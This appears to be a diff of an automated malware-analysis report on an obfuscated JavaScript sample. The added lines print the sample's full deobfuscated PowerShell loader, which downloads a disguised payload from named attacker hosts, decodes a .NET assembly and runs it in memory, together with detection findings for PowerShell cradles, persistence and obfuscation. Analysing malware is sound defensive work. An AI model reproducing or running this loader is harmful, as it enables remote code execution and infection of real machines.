@@ -2,7 +2,7 @@
   "byte_count": 40906,
   "entropy": 4.503,
   "file_magic": "source-like text",
-  "generated_at": "2026-06-21T14:06:06.590442+00:00",
+  "generated_at": "2026-06-21T14:19:49.470702+00:00",
   "md5": "f749306e539eab248f698468a5ffc7f0",
   "metadata": {
     "anonymous": 0,
@@ -17,7 +17,7 @@
     "imphash": null,
     "intelligence": {
       "clamav": null,
-      "downloads": "157",
+      "downloads": "160",
       "mail": null,
       "uploads": "1"
     },
@@ -49,14 +49,130 @@
   "source_name": "daf2410a4e6da576f80df9cfd4b69eb8b2ee74c49948a501d6618063c7950437.js",
   "static_code": {
     "byte_count": 40906,
+    "decoded_layers": [
+      {
+        "depth": 1,
+        "domains": [
+          "kickstrean.art"
+        ],
+        "encoding": "utf-16le",
+        "ips": [
+          "66.63.170.33"
+        ],
+        "preview": "Start-Sleep -Seconds 3 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 $b64='dXNpbmcgU3lzdGVtOyB1c2luZyBTeXN0ZW0uUmVmbGVjdGlvbjsgcHVibGljIGNsYXNzIFBoYW50b21HYXRle3B",
+        "urls": [
+          "http://kickstrean.art/1.jpg",
+          "https://66.63.170.33/img/1.jpg"
+        ]
+      },
+      {
+        "depth": 2,
+        "domains": [],
+        "encoding": "utf-8",
+        "ips": [],
+        "preview": "using System; using System.Reflection; public class PhantomGate{public static Assembly LoadAssembly(byte[] f){Assembly b=null; if(b==null){} return AppDomain.CurrentDomain.Load(f);}}",
+        "urls": []
+      }
+    ],
+    "deobfuscated": [
+      "powershell \"$ddsfdfdjhsdfgdgo = 'DQAKAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADMADQAKAFsATgBlAHQALgBTAGUAcgB2AGkAYwBlAFAAbwBpAG4AdABNAGEAbgBhAGcAZQByAF0AOgA6AFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB0AG8AYwBvAGwAIAA9ACAAWwBOAGUAdAAuAFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB0AG8AYwBvAGwAVAB5AHAAZQBdADoAOgBUAGwAcwAxADIADQAKACQAYgA2ADQAPQAnAGQAWABOAHAAYgBtAGMAZwBVADMAbAB6AGQARwBWAHQATwB5AEIAMQBjADIAbAB1AFoAeQBCAFQAZQBYAE4AMABaAFcAMAB1AFUAbQBWAG0AYgBHAFYAagBkAEcAbAB2AGIAagBzAGcAYwBIAFYAaQBiAEcAbABqAEkARwBOAHMAWQBYAE4AegBJAEYAQgBvAFkAVwA1ADAAYgAyADEASABZAFgAUgBsAGUAMwBCADEAWQBtAHgAcABZAHkAQgB6AGQARwBGADAAYQBXAE0AZwBRAFgATgB6AFoAVwAxAGkAYgBIAGsAZwBUAEcAOQBoAFoARQBGAHoAYwAyAFYAdABZAG0AeAA1AEsARwBKADUAZABHAFYAYgBYAFMAQgBtAEsAWAB0AEIAYwAzAE4AbABiAFcASgBzAGUAUwBCAGkAUABXADUAMQBiAEcAdwA3AEkARwBsAG0ASwBHAEkAOQBQAFcANQAxAGIARwB3AHAAZQAzADAAZwBjAG0AVgAwAGQAWABKAHUASQBFAEYAdwBjAEUAUgB2AGIAVwBGAHAAYgBpADUARABkAFgASgB5AFoAVwA1ADAAUgBHADkAdABZAFcAbAB1AEwAawB4AHYAWQBXAFEAbwBaAGkAawA3AGYAWAAwAD0AJwANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAYgA2ADQAKQApACkADQAKAGYAdQBuAGMAdABpAG8AbgAgAGQAKAAkAGwAKQB7ACQAdwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAKABHAGUAdAAtAFIAYQBuAGQAbwBtACAAJABsACAALQBDAG8AdQBuAHQAIAAkAGwALgBDAG8AdQBuAHQAKQB8ACUAewB0AHIAeQB7AHIAZQB0AHUAcgBuACAAJAB3AC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAF8AKQB9AGMAYQB0AGMAaAB7AH0AfQB9AA0ACgBmAHUAbgBjAHQAaQBvAG4AIABpACgAJABhACwAJAB0ACwAJABtACwAJABwAD0AQAAoACkAKQB7ACQAeQA9AFsAUABoAGEAbgB0AG8AbQBHAGEAdABlAF0AOgA6AEwAbwBhAGQAQQBzAHMAZQBtAGIAbAB5ACgAJABhACkAOwAkAHIAPQAkAHkALgBHAGUAdABUAHkAcABlAHMAKAApAHwAPwB7ACQAXwAuAEYAdQBsAGwATgBhAG0AZQAgAC0AZQBxACAAJAB0AH0AOwAkAG4APQAkAHIALgBHAGUAdABNAGUAdABoAG8AZAAoACQAbQAsACgAWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQgBpAG4AZABpAG4AZwBGAGwAYQBnAHMAXQAnAFAAdQBiAGwAaQBjACwATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAsAEkAbgBzAHQAYQBuAGMAZQAnACkAKQA7ACQAbwA9AGkAZgAoACEAJABuAC4ASQBzAFMAdABhAHQAaQBjACkAewBbAEEAYwB0AGkAdgBhAHQAbwByAF0AOgA6AEMAcgBlAGEAdABlAEkAbgBzAHQAYQBuAGMAZQAoACQAcgApAH0AOwAkAG4ALgBJAG4AdgBvAGsAZQAoACQAbwAsACQAcAApAH0ADQAKAA0ACgAkAGsAPQBAACgAKAAnAGgAdAB0AHAAOgAvAC8AawBpAGMAawBzAHQAcgBlAGEAbgAuAGEAcgB0AC8AMQAuAGoAcABnACcAKQAsACgAJwBoAHQAdABwAHMAOgAvAC8ANgA2AC4ANgAzAC4AMQA3ADAALgAzADMALwBpAG0AZwAvADEALgBqAHAAZwAnACkAKQANAAoAaQBmACgAKAAkAGcAPQBkACAAJABf#ACkALQBhAG4AZAAoACQAdAA9AFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGcAKQApAC0AbQBhAHQAYwBoACcAPAA8AFMAVABBACcAIAAf#ACAAJwBSAFQAPgA+ACgALgAqAD8AKQA8ADwARQBOAEQAPgA+ACcAKQB7AA0ACgAgACAAJABnAGcAZgAgAD0AIAAnADkANAA0AGsAMgBWAC8AdwBhAHIALwBsAGEALgBzAGEALwAvADoAcwBnAHMAZgBoAGYAcwBmAHMAZAAnACAAOwAgACQAZwBnAGYAIAA9ACAAJABnAGcAZgAuAFMAdQBiAHMAdAByAGkAbgBnACgAMAAsACAAJABnAGcAZgAuAEwAZQBuAGcAdABoACAALQAgADkAKQANAAoAJABsACAAPQAgACcAMAAnACAAOwANAAoAIAAgACAAIABpACAAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQATQBhAHQAYwBoAGUAcwBbADEAXQApACkAIAAnAG0AeQBwAHIAbwBnAHIAYQBtAC4ASABvAG0AZQBlAHMAJwAgACcAcgB1AG4AcwBzACcAIABAACgAJABnAGcAZgAsACAAJABsACwAIAAnACcALAAgACcATQBzAGIAdQBpAGwAZAAnACwAIAAnADAAJwAgACwAIAAnAHgAOAA2ACcAKQANAAoAIAAgACAAIABHAGUAdAAtAFAAcgBvAGMAZQBzAHMAfABzAG8AcgB0ACAAQwBQAFUAIAAtAGQAZQBzAGMAfABzAGUAbABlAGMAdAAgAC0AZgBpAHIAcwB0ACAANQB8AGYAdAAgAE4AYQBtAGUALABDAFAAVQAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgAA==';$OhgjuxD = [system.Text.encoding]::Unicode.GetString([system.convert]::Frombase64string( $ddsfdfdjhsdfgdgo.replace('f#','r')));iex $OhgjuxD\"\r\n"
+    ],
     "domains": [],
     "entropy": 4.503,
     "findings": [
+      {
+        "category": "shell_execution",
+        "detail": "Matched 1 occurrence(s)",
+        "severity": "high",
+        "value": "powershell(?:\\.exe)?"
+      },
+      {
+        "category": "powershell_cradle",
+        "detail": "Matched 1 occurrence(s)",
+        "severity": "high",
+        "value": "Invoke-Expression|\\bIEX\\b"
+      },
+      {
+        "category": "powershell_cradle",
+        "detail": "Matched 1 occurrence(s)",
+        "severity": "high",
+        "value": "FromBase64String"
+      },
       {
         "category": "persistence",
         "detail": "Matched 1 occurrence(s)",
         "severity": "medium",
         "value": "Startup"
+      },
+      {
+        "category": "obfuscation",
+        "detail": "Recovered 1 concatenated/obfuscated payload string(s)",
+        "severity": "high",
+        "value": "concat_replace_deobfuscation"
+      },
+      {
+        "category": "obfuscation",
+        "detail": "Found 3 long base64-like blob(s)",
+        "severity": "medium",
+        "value": "base64_blob"
+      },
+      {
+        "category": "decoded_hint",
+        "detail": "Preview from base64-like blob; not executed",
+        "severity": "info",
+        "value": "S t a r t - S l e e p - S e c o n d s 3 [ N e t . S e r v i c e P o i n t M a n a g e r ] : : S e c u r i t"
+      },
+      {
+        "category": "decoded_hint",
+        "detail": "Preview from base64-like blob; not executed",
+        "severity": "info",
+        "value": ") - a n d ( $ t = [ T e x t . E n c o d i n g ] : : U T F 8 . G e t S t r i n g ( $ g ) ) - m a t c h ' < < S T A '"
+      },
+      {
+        "category": "decoded_hint",
+        "detail": "Preview from base64-like blob; not executed",
+        "severity": "info",
+        "value": "' R T > > ( . * ? ) < < E N D > > ' ) { $ g g f = ' 9 4 4 k 2 V / w a r / l a . s a / / : s g s f h f s f"
+      }
+    ],
+    "functions": [
+      {
+        "behaviour_markers": [],
+        "body_excerpt": "function perturb(v, shift) {\r\n        var n = (v ^ (v << shift) ^ (v >> 2));\r\n        n = (n * 13) & 0xFFFF;\r\n        return n;\r\n    }\r\n\r\n    return (perturb(x, 6) ^ 0x6D3F) + perturb(y, 4);",
+        "calls": [
+          "perturb",
+          "return"
+        ],
+        "name": "quantumDrift",
+        "signature": "function quantumDrift(x, y)",
+        "truncated": false
+      },
+      {
+        "behaviour_markers": [],
+        "body_excerpt": "var n = (v ^ (v << shift) ^ (v >> 2));\r\n        n = (n * 13) & 0xFFFF;\r\n        return n;",
+        "calls": [],
+        "name": "perturb",
+        "signature": "function perturb(v, shift)",
+        "truncated": false
+      },
+      {
+        "behaviour_markers": [],
+        "body_excerpt": "function distort(v, shift) {\r\n        var n = ((v << shift) ^ (v >> 5) ^ (v * 31)) & 0xFFFF;\r\n        return n;\r\n    }\r\n\r\n    return (distort(x, 3) ^ 0x3C3C) + distort(y, 6);",
+        "calls": [
+          "distort",
+          "return"
+        ],
+        "name": "chaosPulse",
+        "signature": "function chaosPulse(x, y)",
+        "truncated": false
+      },
+      {
+        "behaviour_markers": [],
+        "body_excerpt": "var n = ((v << shift) ^ (v >> 5) ^ (v * 31)) & 0xFFFF;\r\n        return n;",
+        "calls": [],
+        "name": "distort",
+        "signature": "function distort(v, shift)",
+        "truncated": false
       }
     ],
     "ips": [],
